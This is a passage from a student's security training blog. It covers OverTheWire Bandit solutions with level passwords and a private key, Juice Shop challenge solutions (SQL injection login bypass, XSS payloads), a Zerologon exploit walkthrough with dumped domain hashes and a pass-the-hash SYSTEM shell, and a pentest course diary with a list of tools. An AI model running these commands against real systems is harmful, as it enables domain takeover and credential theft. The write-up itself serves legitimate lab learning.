bandit12@bandit:/tmp/wem$ mv data_output data.gz
bandit12@bandit:/tmp/wem$ gzip -d data.gz
bandit12@bandit:/tmp/wem$ ls
data  data.txt

bandit12@band it:/tmp/wem$ file data
data: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/wem$ mv data data.bz2
bandit12@bandit:/tmp/wem$ bzip2 -d data.bz2

bandit12@bandit:/tmp/wem$ file data
data: gzip compressed data, was "data4.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
bandit12@bandit:/tmp/wem$ mv data data.gz

bandit12@bandit:/tmp/wem$ ls
data.gz  data.txt
bandit12@bandit:/tmp/wem$ gzip -d data.gz
bandit12@bandit:/tmp/wem$ ls
data  data.txt

bandit12@bandit:/tmp/wem$ file data
data: POSIX tar archive (GNU)
bandit12@bandit:/tmp/wem$ mv data data.tar
bandit12@bandit:/tmp/wem$ tar xvf data.tar
data5.bin

bandit12@bandit:/tmp/wem$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/wem$ mv data5.bin data5.tar
bandit12@bandit:/tmp/wem$ tar xvf data5.tar
data6.bin

bandit12@bandit:/tmp/wem$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/wem$ mv data6.bin data6.tar
bandit12@bandit:/tmp/wem$ tar xvf data6.tar
data8.bin

bandit12@bandit:/tmp/wem$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
bandit12@bandit:/tmp/wem$ mv data8.bin data8.gz
bandit12@bandit:/tmp/wem$ gzip -d data8.gz

bandit12@bandit:/tmp/wem$ ls
data5.tar  data6.tar  data8  data.tar  data.txt
bandit12@bandit:/tmp/wem$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

`ssh bandit13@bandit.labs.overthewire.org -p 2220`  | pwd : `8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL`

</details>


<details>
 <summary>Level 13 → Level 14</summary>
 

```terminal {title="bash"}
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
Could not create directory '/home/bandit13/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

`ssh bandit14@bandit.labs.overthewire.org -p 2220`  | pwd : `4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e`

</details>


<details>
 <summary>Level 14 → Level 15</summary>

```terminal {title="bash"}
bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

```

`ssh bandit15@bandit.labs.overthewire.org -p 2220`  | pwd : `BfMYroe26WYalil77FoDi9qh59eK5xNr`

</details>


<details>
 <summary>Level 15 → Level 16</summary>

```terminal {title="bash"}
bandit15@bandit:~$ echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -quiet -connect localhost:30001
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
```

`ssh bandit16@bandit.labs.overthewire.org -p 2220`  | pwd : `cluFn7wTiGryunymYOu4RcffSxQluehd`

</details>


<details>
 <summary>Level 16 → Level 17</summary>

```terminal {title="bash"}
bandit16@bandit:~$ nmap localhost -p 31000-32000

Starting Nmap 7.40 ( https://nmap.org ) at 2021-10-27 14:51 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00040s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds

bandit16@bandit:/tmp/wem1$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -quiet -connect localhost:31790
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

bandit16@bandit:/tmp/wem1$ chmod 600 sshkey.private
bandit16@bandit:/tmp/wem1$ ssh -i sshkey.private bandit17@localhost
bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
```

`ssh bandit17@bandit.labs.overthewire.org -p 2220`  | pwd : `xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn`

</details>


<details>
 <summary>Level 17 → Level 18</summary>
 

```terminal {title="bash"}
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
> w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
---
> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```

`ssh bandit18@bandit.labs.overthewire.org -p 2220`  | pwd : `kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd`

</details>


<details>
 <summary>Level 18 → Level 19</summary>
 

```terminal {title="bash"}
λ ssh bandit18@bandit.labs.overthewire.org -p 2220 /bin/bash
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:
id
uid=11018(bandit18) gid=11018(bandit18) groups=11018(bandit18)
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

`ssh bandit19@bandit.labs.overthewire.org -p 2220`  | pwd : `IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x`

</details>


<details>
 <summary>Level 19 → Level 20</summary>

```terminal {title="bash"}
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

`ssh bandit20@bandit.labs.overthewire.org -p 2220`  | pwd : `GbKksEFF4yrVs6il55v6gwY5aVje5f0j`

</details>


<details>
 <summary>Level 20 → Level 21</summary>
 

```terminal {title="bash"}
bandit20@bandit:~$ nc -l 55555

./suconnect 55555
```

`ssh bandit21@bandit.labs.overthewire.org -p 2220`  | pwd : `gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr`

</details>


<details>
 <summary>Level 21 → Level 22</summary>
 

```terminal {title="bash"}
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:~$
```

`ssh bandit22@bandit.labs.overthewire.org -p 2220`  | pwd : `Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI`

</details>


<details>
 <summary>Level 22 → Level 23</summary>
 

```terminal {title="bash"}
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@bandit:~$
```

`ssh bandit23@bandit.labs.overthewire.org -p 2220`  | pwd : `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`

</details>


<details>
 <summary>Level 23 → Level 24</summary>
 

```terminal {title="bash"}
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat  /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ vi /tmp/cron24.sh
bandit23@bandit:~$ cat /tmp/cron24.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/password24
bandit23@bandit:~$ cp /tmp/cron24.sh /var/spool/bandit24
bandit23@bandit:~$ cat /tmp/password24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

`ssh bandit24@bandit.labs.overthewire.org -p 2220`  | pwd : `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

</details>


<details>
 <summary>Level 24 → Level 25</summary>
 

```terminal {title="bash"}
bandit24@bandit:~$ vi /tmp/brute25.sh
#!/bin/bash
password=$(cat /etc/bandit_pass/bandit24)
for i in $(seq -w 9999); 
do
    echo "$password $i" | nc localhost 30002 
done
bandit24@bandit:/tmp$ chmod +x brute25.sh
bandit24@bandit:/tmp$ ./brute25.sh
[...]
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
[...]
```

`ssh bandit25@bandit.labs.overthewire.org -p 2220`  | pwd : `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`

</details>

<br>

---

# Top 10 OWASP 2021


>[What is the OWASP Top 10?](https://www.cloudflare.com/learning/security/threats/owasp-top-10/)
>
>The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks. The report is put together by a team of security experts from all over the world. OWASP refers to the Top 10 as an ‘awareness document’ and they recommend that all companies incorporate the report into their processes in order to minimize and/or mitigate security risks.

https://owasp.org/Top10/

-   **[A01:2021-Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)** moves up from the fifth position to the category with the most serious web application security risk; the contributed data indicates that on average, 3.81% of applications tested had one or more Common Weakness Enumerations (CWEs) with more than 318k occurrences of CWEs in this risk category. The 34 CWEs mapped to Broken Access Control had more occurrences in applications than any other category.
-   **[A02:2021-Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)** shifts up one position to #2, previously known as **A3:2017-Sensitive Data Exposure**, which was broad symptom rather than a root cause. The renewed name focuses on failures related to cryptography as it has been implicitly before. This category often leads to sensitive data exposure or system compromise.
-   **[A03:2021-Injection](https://owasp.org/Top10/A03_2021-Injection/)** slides down to the third position. 94% of the applications were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3.37%, and the 33 CWEs mapped into this category have the second most occurrences in applications with 274k occurrences. Cross-site Scripting is now part of this category in this edition.
-   **[A04:2021-Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)** is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to "move left" as an industry, we need more threat modeling, secure design patterns and principles, and reference architectures. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks.
-   **[A05:2021-Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)** moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.5%, and over 208k occurrences of CWEs mapped to this risk category. With more shifts into highly configurable software, it's not surprising to see this category move up. The former category for **A4:2017-XML External Entities (XXE)** is now part of this risk category.
-   **[A06:2021-Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)** was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.
-   **[A07:2021-Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)** was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.
-   **[A08:2021-Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)** is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. **A8:2017-Insecure Deserialization** is now a part of this larger category.
-   **[A09:2021-Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)** was previously **A10:2017-Insufficient Logging & Monitoring** and is added from the Top 10 community survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn't well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.
-   **[A10:2021-Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)** is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it's not illustrated in the data at this time.

When I have time, I'll update this post with an exemple/demo for each point.

---

# Juice Shop


> Juice Shop is a web-application that contains a vast number of hacking challenges of varying difficulty where the user is supposed to exploit the underlying vulnerabilities.

- https://owasp.org/www-project-juice-shop/
- http://juice-shop.herokuapp.com/

This is where I lack practice so I was looking forward to this but unfortunalety we didn't spent too much time on it.

Here's a few easy (1 star) challenges :

>First thing first, we need to **Find the score board** to acces all the different challenges : 
>
> <kbd>F12</kbd> to inspect the page > `Debugger` tab > In the [`main.js`](http://192.168.43.100:3000/main.js) file, we can find this : ![](IMG/AT3C3_Sec_img_50.png)
>
>so `http://IP_ADDRESS/#/score-board`
>
>![](IMG/AT3C3_Sec_img_51.png)

>Challenge : **Zero Stars** \
>Description : **Give a devastating zero-star feedback to the store.**
>
>Go to the Hamburger menu > Customer Feedback. \
>Make sure intercept is turned on in burpsuite \ 
>
>when you press submit, go see the burp suite interceptor and change : `"rating":1` to `"rating":0`
>
>![](IMG/AT3C3_Sec_img_52.png)
>
>then forward the request and that's it
>
>![](IMG/AT3C3_Sec_img_53.png)

	
>Challenge : **Login Admin** \
>Description : - **Log in with the administrator's user account.**
>
>email: `admin' or 1=1--` \
>password : whatever
>
>![](IMG/AT3C3_Sec_img_24.png)
>
>![](IMG/AT3C3_Sec_img_55.png)

> Challenge : **Error Handling** \
> Description : **Provoke an error that is neither very gracefully nor consistently handled.**
> 
>I found this one accidentaly while tring the admin login challenge
>
>on the login page: 
>Login :`'` \
>password: whatever
>
>![](IMG/AT3C3_Sec_img_54.png)

>Challenge : **DOM XSS** \
>Description : **Perform a _DOM_ XSS attack with `<iframe src="javascript:alert(`xss`)">`.** 
>
>Just put `<iframe src="javascript:alert(`xss`)">` from the description into any text input 
>
>![](IMG/AT3C3_Sec_img_56.png)

>Challenge : **Bonus Payload** \
>Description : **Use the bonus payload `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>` in the _DOM XSS_ challenge.** 
>
>Same as the DOM XSS challenge
>
>![](IMG/AT3C3_Sec_img_57.png)

>Challenge : **Bully Chatbot** \
>Description : **Receive a coupon code from the support chatbot.** 
>
>The bot will ask for your name. \
>if you ask for a coupon it will say no. but as the chall name suggest, you need to bully it. \
>Open burp and intercept the chat request where you ask for a coupon, send it to the repeater and spam the send button. \
>it will eventually give up
>
>![](IMG/AT3C3_Sec_img_62.png)
>
>![](IMG/AT3C3_Sec_img_61.png)


>Challenge : **Exposed Metrics** \
>Description : **Find the endpoint that serves usage data to be scraped by a [popular monitoring system](https://github.com/prometheus/prometheus).** 
>
>Using the documentation provided you find the endpoint `/metrics`, so just visit `http://IP_ADDRESS/metrics`
>
>![](IMG/AT3C3_Sec_img_60.png)


>Challenge : **Missing Encoding** \
>Description : **Retrieve the photo of Bjoern's cat in "melee combat-mode".** 
>
>on the photo wall, all but one image are visible :
>
looking at the source code, I can see that the file name contain caracters that need to be url encoded. \
the two `#`  \
from `😼-#z-atschi-#whoneedsfourlegs-1572600969477.jpg` \
to: `😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg`
>
>![](IMG/AT3C3_Sec_img_64.png)
>
>![](IMG/AT3C3_Sec_img_63.png)


>Challenge : **Outdated Allowlist** \
>Description : **Let us redirect you to one of our crypto currency addresses which are not promoted any longer.** 
>
><kbd>F12</kbd> to inspect the page > `Debugger` tab > In the [`main.js`](http://192.168.43.100:3000/main.js) file, we can find this : \
>
>![](IMG/AT3C3_Sec_img_65.png)
>
>`192.168.43.100:3000//redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm`
>
>![](IMG/AT3C3_Sec_img_66.png)



>Challenge : **Privacy Policy** \
>Description : **Read our privacy policy.** 
>
>Once logged in, ![](IMG/AT3C3_Sec_img_59.png)
>
>![](IMG/AT3C3_Sec_img_58.png)


>Challenge : **Repetitive Registration** \
>Description : **Follow the DRY principle while registering a user.** 
>
>DRY stands for Don't repeat yourself: \
>while registeeing a new user, intercept the resquest with burp
>
>set an empty string In `passwordRepeat` then forward the request
>
>![](IMG/AT3C3_Sec_img_67.png)
>
>![](IMG/AT3C3_Sec_img_68.png)

---

# Trying Zerologon


- https://github.com/VoidSec/CVE-2020-1472

<details>  
 <summary>Live demo : </summary>

[![asciicast](https://asciinema.org/a/359833.svg)](https://asciinema.org/a/359833)

</details>



> First, make sure to have [impacket installed](https://github.com/VoidSec/CVE-2020-1472#1-install-impacket-as-follows)  \
> and the [ZeroLogon Script](https://github.com/VoidSec/CVE-2020-1472#2-install-the-zerologon-exploit-script-as-follows) Downloaded

If we try to extract the hashes first, we see an `STATUS_LOGON_FAILURE` error.

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/impacket/examples/CVE-2020-1472]
└─$ impacket-secretsdump -no-pass -just-dc HACK/'YETANOTHERAD$'@192.168.20.21 
Impacket v0.9.24.dev1+20211021.173706.20ccf828 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[*] Cleaning up... 
```

Running the exploit

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/impacket/examples/CVE-2020-1472]
└─$ sudo python3 cve-2020-1472-exploit.py -n YETANOTHERAD -t 192.168.20.21
 _____                   __                      
/__  /  ___  _________  / /___  ____ _____  ____ 
  / /  / _ \/ ___/ __ \/ / __ \/ __ `/ __ \/ __ \
 / /__/  __/ /  / /_/ / / /_/ / /_/ / /_/ / / / /
/____/\___/_/   \____/_/\____/\__, /\____/_/ /_/ 
                             /____/              

Checker & Exploit by VoidSec

Performing authentication attempts...
.................................................................................................
[+] Success: Target is vulnerable!
[-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y
y
[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.
```

Now if try launch the first command again, we get the hahes: 

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/impacket/examples/CVE-2020-1472]
└─$ impacket-secretsdump -no-pass -just-dc HACK/'YETANOTHERAD$'@192.168.20.21
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:b21f7650dab1584afa303fe65a0b7fbc:::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82b5180f2d2f591dc7c27e80ac68d282:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
YETANOTHERAD$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:8ffc8e7d5dece2913a43a0e68b51c5a430957f3f8318038b20cc5051138bcd3a
krbtgt:aes128-cts-hmac-sha1-96:9929c79bc58c858e697df877b10788a0
krbtgt:des-cbc-md5:26019e6ba489e602
YETANOTHERAD$:aes256-cts-hmac-sha1-96:5284031d0f0ff219eaabfb108f070ed476fa7c8e2715524a429e87f4ed90221d
YETANOTHERAD$:aes128-cts-hmac-sha1-96:b364d60c6d09c38516701172707d683e
YETANOTHERAD$:des-cbc-md5:57cb4520cef78613
[*] Cleaning up...
```

And we can login to the maching using one of them

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/impacket/examples/CVE-2020-1472]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b21f7650dab1584afa303fe65a0b7fbc administrateur@192.168.20.21                                                      2 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.20.21.....
[*] Found writable share ADMIN$
[*] Uploading file GLZEGzSe.exe
[*] Opening SVCManager on 192.168.20.21.....
[*] Creating service IvIR on 192.168.20.21.....
[*] Starting service IvIR.....
[!] Press help for extra shell commands
Microsoft Windows [version 10.0.14393]
(c) 2016 Microsoft Corporation. Tous droits réservés.

C:\Windows\system32>whoami
autorite nt\système

C:\Windows\system32>
```

bingo, nt system

<br>

---

<br>

# Week 2 - Pentest/Audit



Semaine du 15/11/2021 au 19/11/2021 \

> Fortunately for the Clients but unfortunately for this post we all signed a NDA, so I can't really say anything about what we found or who are the client. \
> So I'll just explain what we "did" and list some of the tools that we used.

## Timeline
 
- **Monday** \
	- **9:00** - We  came in monday morning without knowing who would be the client. <br> \
We quickly learned that it was a realy big univertisy with over 30k students,  150 differents Public IP and that we would have a lot freedom but we wouldn't be able to run any intrusif nmap scan. \
This will be client 1. \
We made contact with the person in charge to explain what this pentest will be about, ask about the scope, what are we authorised to do if we found something interesting etc. \
Then with a template provided by our instructor, we started to write the contract. \
While waiting for the CISO to read, accept and sign the contract, we started doing some passive recconaissance.  <br> \
	- **12:00** - we got a mail from the person in charge stating that the scope (that THEY gave us) is a bit too wide and that there's some things that he didn't liked. \
	- **17:00** - We got a call from the CISO and he's really not happy, the 2nd version of the contract is still not clear (he basically wants to remove the whole pentest part of it 😐), He's also really not happy about the passive recconaissance we've been doing (even tho it was just browsing the main site and some of the subdomain to see what to expect)  we need to rewrite it again. \

- **Tuesday** \
	- **10:30** - Still no awnser from the client 1. \
	- **11:00** - Being on a limited timeframe, we decided to stop what we were doing with client 1 and started looking for an alternative. \
	- **11:30** - Few weeks ago, CEFIM posted an ad looking for a place we could do our pentest on. An old student responded that he may be interested. So we contacted him. \
He seemed really iterested as he basicaly was the only IT/SysAdmin guy and he didn't really had time to do it himself \
	- **15:00** - He came in person to meet us, explain what he's expecting and what would be the scope. \
	- **16:30** - The new contract is sent and we are waiting for the consent of both end party to really start the pentest.

- **Wednesday**
	- **9:00** - Hurray, the contract is signed, we can finnaly start working.
	- **9:01** - This is where the fun begins

- **Thursday** \
	- **9:00** - having fun

- **Friday** \
	- **9:00** - We were a group of 10 students and the scope was 10 different addresses so this should be enough. We had 2 full days but since we didn't amm had the same skillset, not every one understood (and apparently didn't wanted to) what each tools were doing. \
Out of the 10 addresses, maybe half were using the same IP but with different vhost. Since we made a lot of noise running our scan, we quickly ran againt the OVH anti ddos protection. \
	- **9:30** - it's time to stop the pentest and start writing the report. \
	- **15:30** - Again, the Client came in person with a developper to attend to our presentation to explain what we found, all the vulnerabilities and what can be done. \
	- **17:30** - The report if finished we can send the final version to Client 2. \
	- **18:30** - Now it's time to relax at the pub 🍺



## Tools Used


- [WPScan](https://github.com/wpscanteam/wpscan)
- [SkipFish](https://www.kali.org/tools/skipfish/) ([github](https://github.com/spinkham/skipfish), https://code.google.com/archive/p/skipfish/)
- [Nmap](https://nmap.org/book/man.html)
- [FFUF](https://github.com/ffuf/ffuf)
- [dirbuster](https://www.kali.org/tools/dirbuster/)
- [gobuster](https://www.kali.org/tools/gobuster/) ([github](https://github.com/OJ/gobuster))
- [SQLMap](https://www.kali.org/tools/sqlmap/)
- https://dnsdumpster.com
- https://crt.sh
- https://www.shodan.io
- https://search.censys.io
- https://securitytrails.com/list/apex_domain/exemple.com
- Google/Github Dorks
	- https://github.com/cipher387/Dorks-collections-list
	- https://duckduckgo.com/?t=ffab&q=automated+google+dorks&ia=web
	- https://golangexample.com/a-golang-tool-to-automate-google-dork-scan-against-the-entiere-internet-or-specific-targets/
	- https://github.com/R4yGM/dorkscout
- https://github.com/jivoi/awesome-osint
- https://github.com/digitaldisarray/OSINT-Tools
- https://github.com/six2dez/reconftw
- https://github.com/laramies/theHarvester
- https://github.com/mmpx12/pwndb
	- https://sn0int.com/r/kpcyrd/pwndb-emails
	- https://davidtavarez.github.io/2019/pwndb-command-line-tool-python/
	- http://pwndb2am4tzkvold.onion/
- https://duckduckgo.com/?t=ffcm&q=SearchDiggity&ia=web
	- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/

<br>

---


# Week 3 - PSSI : Politique de Sécurité des Systèmes d'Information
 

<br>

Coming Soon